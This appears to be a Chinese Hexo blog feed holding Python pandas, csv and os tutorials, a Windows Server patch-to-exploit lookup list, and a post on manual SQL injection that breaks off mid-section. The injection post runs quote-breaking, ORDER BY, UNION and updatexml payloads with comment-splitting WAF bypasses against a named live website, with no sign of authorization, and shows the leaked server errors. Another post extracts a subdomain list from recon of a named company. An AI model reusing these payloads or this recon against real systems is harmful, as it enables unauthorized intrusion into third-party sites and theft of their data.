class="line">使用str类型传参时会循环出每一个字符在赋值给每一个表头，即不能多也不能少，多或者少都会抛出ValueError错误。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">content_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;,names&#x3D;&quot;abcdefghijklmn&quot;)</span><br><span class="line">print(content_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url</span><br><span class="line">      a                                  b  ...     m   n</span><br><span class="line">0     9                 http:&#x2F;&#x2F;52mf.com:80  ...   0.2   1</span><br><span class="line">1    43            http:&#x2F;&#x2F;mail.52mf.com:80  ...   2.5   2</span><br><span class="line">2    51          https:&#x2F;&#x2F;mail.52mf.com:443  ...   2.5   2</span><br><span class="line">3    60      http:&#x2F;&#x2F;renter-api.52mf.com:80  ...   2.6   3</span><br><span class="line">4    68    https:&#x2F;&#x2F;renter-api.52mf.com:443  ...   2.6   3</span><br><span class="line">5    77             http:&#x2F;&#x2F;www.52mf.com:80  ...   2.6   3</span><br><span class="line">6    85           https:&#x2F;&#x2F;www.52mf.com:443  ...   2.6   3</span><br><span class="line">7    94               http:&#x2F;&#x2F;m.52mf.com:80  ...   9.4   4</span><br><span class="line">8   102             https:&#x2F;&#x2F;m.52mf.com:443  ...   9.4   4</span><br><span class="line">9   111              http:&#x2F;&#x2F;oa.52mf.com:80  ...   9.4   4</span><br><span class="line">10  145             http:&#x2F;&#x2F;vpn.52mf.com:80  ...  None   1</span><br><span class="line">11  153           https:&#x2F;&#x2F;vpn.52mf.com:443  ...  None   1</span><br><span class="line">12  162            http:&#x2F;&#x2F;smtp.52mf.com:80  ...  None   2</span><br><span class="line">13  170          https:&#x2F;&#x2F;smtp.52mf.com:443  ...  None   2</span><br><span class="line">14  179        http:&#x2F;&#x2F;provider.52mf.com:80  ...  None   4</span><br><span class="line">15  196             http:&#x2F;&#x2F;pop.52mf.com:80  ...  None   5</span><br><span class="line">16  204           https:&#x2F;&#x2F;pop.52mf.com:443  ...  None   5</span><br><span class="line">17  230            http:&#x2F;&#x2F;imap.52mf.com:80  ...  None   7</span><br><span class="line">18  238          https:&#x2F;&#x2F;imap.52mf.com:443  ...  None   7</span><br><span class="line">19  281               http:&#x2F;&#x2F;s.52mf.com:80  ...  None  13</span><br><span class="line">20  289             https:&#x2F;&#x2F;s.52mf.com:443  ...  None  13</span><br><span class="line">21  315    http:&#x2F;&#x2F;autodiscover.52mf.com:80  ...  None  16</span><br><span class="line">22  323  https:&#x2F;&#x2F;autodiscover.52mf.com:443  ...  None  16</span><br></pre></td></tr></table></figure><h6 id="usecols"><a href="#usecols" class="headerlink" title="usecols"></a>usecols</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">值为None、int、str、list类型，指定读取表格的指定列</span><br><span class="line"> </span><br><span class="line">None时，读取整个excel列</span><br><span class="line">int时，读取从第一列开始到该数值（包含）结束的中间所有列</span><br><span class="line">str时，只能按照excel的格式指定列，如&quot;A: G&quot;，读取A列到G列的所有列</span><br><span class="line">list时，list的元素只能是int型，如：[1, 4],表示读取list内指定的第一和第四列</span><br></pre></td></tr></table></figure><h5 id="案例–渗透中扫描到子域名存入xlsx文件并提取子域名"><a href="#案例–渗透中扫描到子域名存入xlsx文件并提取子域名" class="headerlink" title="案例–渗透中扫描到子域名存入xlsx文件并提取子域名"></a>案例–渗透中扫描到子域名存入xlsx文件并提取子域名</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">content_list = pd.read_excel(<span class="string">&quot;./52mf.com.xlsx&quot;</span>,usecols=[<span class="number">2</span>,<span class="number">5</span>],names=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">contents_list = content_list.values.tolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;./mofang_url.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> list <span class="keyword">in</span> contents_list:</span><br><span class="line">        print(list[<span class="number">0</span>])</span><br><span class="line">        fp.write(list[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Python处理cvs文档"><a href="#Python处理cvs文档" class="headerlink" title="Python处理cvs文档"></a>Python处理cvs文档</h4><h5 id="CSV文件的写入"><a href="#CSV文件的写入" class="headerlink" title="CSV文件的写入"></a>CSV文件的写入</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以写入方式打开一个csv文件</span></span><br><span class="line">file = open(<span class="string">&#x27;steady.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用writer方法，传入csv文件对象，得到的结果是一个CSVWriter对象</span></span><br><span class="line">writer = csv.writer(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用CSVWriter对象的writerow方法，一行行的写入数据</span></span><br><span class="line">writer.writerow([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;score&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以调用writerows方法，一次性写入多行数据</span></span><br><span class="line">writer.writerows([[<span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;18&#x27;</span>, <span class="string">&#x27;98&#x27;</span>],[<span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;99&#x27;</span>], [<span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;17&#x27;</span>, <span class="string">&#x27;90&#x27;</span>], [<span class="string">&#x27;jerry&#x27;</span>, <span class="string">&#x27;19&#x27;</span>, <span class="string">&#x27;95&#x27;</span>]])</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h5 id="CSV文件的读取"><a href="#CSV文件的读取" class="headerlink" title="CSV文件的读取"></a>CSV文件的读取</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以读取方式打开一个csv文件</span></span><br><span class="line">file = open(<span class="string">&#x27;steady.csv&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用csv模块的reader方法，得到的结果是一个可迭代对象</span></span><br><span class="line">reader = csv.reader(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对结果进行遍历，获取到结果里的每一行数据</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">    print(row)</span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--os库的使用</title>
      <link href="2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h1><p>OS模块简单的来说它是一个Python的系统编程的操作模块，可以处理文件和目录这些我们日常手动需要做的操作。</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="获取当前系统"><a href="#获取当前系统" class="headerlink" title="获取当前系统"></a>获取当前系统</h3><figure class="highlight python"><figcaption><span>y</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(os.name)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#若是Windows则输出&#39;nt&#39;，若是Linux&#x2F;Unix，则是&#39;posix&#39;</span><br></pre></td></tr></table></figure><h3 id="获取当前文件的绝对路径"><a href="#获取当前文件的绝对路径" class="headerlink" title="获取当前文件的绝对路径"></a>获取当前文件的绝对路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_path = os.path.abspath(__file__)</span><br><span class="line">print(steady_path)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py</span><br></pre></td></tr></table></figure><h3 id="获取当前目录"><a href="#获取当前目录" class="headerlink" title="获取当前目录"></a>获取当前目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">cwd &#x3D; os.getcwd()</span><br><span class="line">print(cwd)</span><br></pre></td></tr></table></figure><p>输出：获取的是python的工作目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple</span><br></pre></td></tr></table></figure><h3 id="判断文件是否存在，返回值为布尔型"><a href="#判断文件是否存在，返回值为布尔型" class="headerlink" title="判断文件是否存在，返回值为布尔型"></a>判断文件是否存在，返回值为布尔型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_path = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line">steady_file = os.path.exists(steady_path)</span><br><span class="line">print(<span class="string">&quot;file path: [&#123;&#125;] is exist: &#123;&#125;&quot;</span>.format(steady_path, steady_file))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file path: [&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py] is exist: True</span><br></pre></td></tr></table></figure><h3 id="获取当前文件的名称"><a href="#获取当前文件的名称" class="headerlink" title="获取当前文件的名称"></a>获取当前文件的名称</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_name = os.path.basename(__file__)</span><br><span class="line">print(steady_name)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady.py</span><br></pre></td></tr></table></figure><h3 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">old_file = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line"></span><br><span class="line">new_file = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line"></span><br><span class="line">os.rename(old_file, new_file)</span><br></pre></td></tr></table></figure><h3 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><h4 id="os-makedirs"><a href="#os-makedirs" class="headerlink" title="os.makedirs"></a><code>os.makedirs</code></h4><p>创建多级目录，路径中的多个文件夹都不存在时，可以递归创建，steady和steady1文件夹本身没有。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;</span><br><span class="line">os.mkdir(steady_path)</span><br></pre></td></tr></table></figure><h4 id="os-path-mkdir"><a href="#os-path-mkdir" class="headerlink" title="os.path.mkdir"></a><code>os.path.mkdir</code></h4><p>只能创建一个文件夹， steady文件夹存在，才能创建steady1文件夹，如果steady文件夹不存在，则会出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;</span><br><span class="line">os.mkdir(steady_path)</span><br></pre></td></tr></table></figure><h3 id="获取文件夹下的所有文件名"><a href="#获取文件夹下的所有文件名" class="headerlink" title="获取文件夹下的所有文件名"></a>获取文件夹下的所有文件名</h3><p>获取文件夹code下的所有文件名，以列表的形式返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&quot;</span><br><span class="line">steady_names &#x3D; os.listdir(steady_path)</span><br><span class="line">print(steady_names)</span><br></pre></td></tr></table></figure><h3 id="获取文件夹下的所有文件夹和文件（无递归遍历）"><a href="#获取文件夹下的所有文件夹和文件（无递归遍历）" class="headerlink" title="获取文件夹下的所有文件夹和文件（无递归遍历）"></a>获取文件夹下的所有文件夹和文件（无递归遍历）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(os.scandir(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;&quot;))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;posix.ScandirIterator object at 0x1056a1e30&gt;</span><br></pre></td></tr></table></figure><p>返回的是可迭代对象，可以用for循环迭代一下遍出结果。</p><h3 id="f-is-file"><a href="#f-is-file" class="headerlink" title="f.is_file()"></a>f.is_file()</h3><p>is_file判断是否是文件。</p><h3 id="将path分割成路径名和文件名"><a href="#将path分割成路径名和文件名" class="headerlink" title="将path分割成路径名和文件名"></a>将path分割成路径名和文件名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;))</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[0])</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[1])</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple&#x2F;Desktop</span><br><span class="line">steady1.py</span><br></pre></td></tr></table></figure><h3 id="拼接目录与文件名或目录"><a href="#拼接目录与文件名或目录" class="headerlink" title="拼接目录与文件名或目录"></a>拼接目录与文件名或目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.path.join(&#39;I&#39;, &#39;am&#39;, &#39;steady&#39;))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&#x2F;am&#x2F;steady</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--windows系统常见漏洞与系统补丁</title>
      <link href="2020/11/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81/"/>
      <url>2020/11/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81/</url>
      
        <content type="html"><![CDATA[<h1 id="Win2003"><a href="#Win2003" class="headerlink" title="Win2003"></a>Win2003</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">KB2360937|MS10-084</span><br><span class="line">KB2478960|MS11-014</span><br><span class="line">KB2507938|MS11-056</span><br><span class="line">KB2566454|MS11-062</span><br><span class="line">KB2646524|MS12-003</span><br><span class="line">KB2645640|MS12-009</span><br><span class="line">KB2641653|MS12-018</span><br><span class="line">KB944653|MS07-067</span><br><span class="line">KB952004|MS09-012 PR</span><br><span class="line">KB971657|MS09-041</span><br><span class="line">KB2620712|MS11-097</span><br><span class="line">KB2393802|MS11-011</span><br><span class="line">KB942831|MS08-005</span><br><span class="line">KB2503665|MS11-046</span><br><span class="line">KB2592799|MS11-080</span><br><span class="line">KB956572|MS09-012烤肉</span><br><span class="line">KB2621440|MS12-020</span><br><span class="line">KB977165|MS10-015Ms Viru</span><br><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day 限32位</span><br><span class="line">KB2707511|MS12-042  sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure><h1 id="Win2008"><a href="#Win2008" class="headerlink" title="Win2008"></a>Win2008</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day  限32位</span><br><span class="line">KB2707511|MS12-042 sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure><h1 id="Win2012"><a href="#Win2012" class="headerlink" title="Win2012"></a>Win2012</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day  限32位</span><br><span class="line">KB2707511|MS12-042 sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--SQL注入漏洞手注练习</title>
      <link href="2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E6%B3%A8%E7%BB%83%E4%B9%A0/"/>
      <url>2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E6%B3%A8%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入漏洞手注练习"><a href="#SQL注入漏洞手注练习" class="headerlink" title="SQL注入漏洞手注练习"></a>SQL注入漏洞手注练习</h1><h2 id="Exp1"><a href="#Exp1" class="headerlink" title="Exp1"></a>Exp1</h2><h3 id="判断字符、数字型、闭合方式"><a href="#判断字符、数字型、闭合方式" class="headerlink" title="判断字符、数字型、闭合方式"></a>判断字符、数字型、闭合方式</h3><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890%27</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><p>正常回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890%27--+</span><br></pre></td></tr></table></figure><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><h4 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h4><p>正常回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; order by 6-- </span><br></pre></td></tr></table></figure><p>输出错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; order by 7-- </span><br></pre></td></tr></table></figure><p>判断字段数量为6。</p><h4 id="回显显示位"><a href="#回显显示位" class="headerlink" title="回显显示位"></a>回显显示位</h4><p>WAF拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union select 1,2,3,4,5,6-- </span><br></pre></td></tr></table></figure><p>拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union select-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; select-- </span><br></pre></td></tr></table></figure><p>不拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union sel&#x2F;**&#x2F;ect-- </span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union sele&#x2F;**&#x2F;ct 1,2,3,4,5,6-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>WAF拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; and updatexml(0,concat(0x7e,database(),0x7e),0)-- </span><br></pre></td></tr></table></figure><p>WAF不拦截但是报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; and updat&#x2F;**&#x2F;exml(0,co&#x2F;**&#x2F;ncat(0x7e,database(),0x7e),0)-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="延时盲注"><a href="#延时盲注" class="headerlink" 